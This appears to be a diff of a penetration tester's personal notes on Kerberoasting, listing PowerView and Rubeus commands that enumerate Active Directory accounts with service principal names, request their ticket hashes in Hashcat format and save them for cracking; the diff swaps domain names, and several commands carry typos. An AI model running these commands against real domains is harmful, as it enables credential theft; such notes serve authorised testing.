@@ -1,4 +1,3 @@
-![[Pasted image 20240110120839.png]]$kerb[0]
 
 .pwdlastset
 
@@ -7,7 +6,6 @@
 $kerb | %{$_.samaccountmave; write-host $_.pwslastset}
 ```
 
-![[Pasted image 20240110120922.png]]
 
 ```
 Kerb | where {$_.samaccountne -eq "admin01"}   | select -property memberof | fl
@@ -15,18 +13,18 @@ Kerb | where {$_.samaccountne -eq "admin01"}   | select -property memberof | f
 
 Look for users with spn, who has a pw most likely to crack.
 
-Get-NetUser -SPN -Domain n.ad.testinternal.com -Server 10.1.1.17 | select serviceprincipalne
+Get-NetUser -SPN -Domain n.ad.gointerspacel.com -Server 10.1.1.17 | select serviceprincipalne
 
 
 This works
-$kerberoastble = Get-DomainUser -SPN -Server CR1.cr.na.ad.testinternal.com -Domain cr.n.a.testinternal.com
+$kerberoastble = Get-DomainUser -SPN -Server mars.space.ad.gointerspacel.com -Domain cr.n.a.gointerspacel.com
 
 
 Request hash  with powerview
 
-$kerberoast=Invoke-Kerberoast -Domain soa.ad.testinternal.com -Server 1.1.1.38 -OutputFormat Hashcat
+$kerberoast=Invoke-Kerberoast -Domain soa.ad.gointerspacel.com -Server 1.1.1.38 -OutputFormat Hashcat
 
-.\Rubeus.exe kerberoast /domain:soa.ad.testinternal.com /dc:1.1.1.38 | Out-File -Append SOA-SPN_hashes.txt
+.\Rubeus.exe kerberoast /domain:soa.ad.gointerspacel.com /dc:1.1.1.38 | Out-File -Append SOA-SPN_hashes.txt
 
 
 
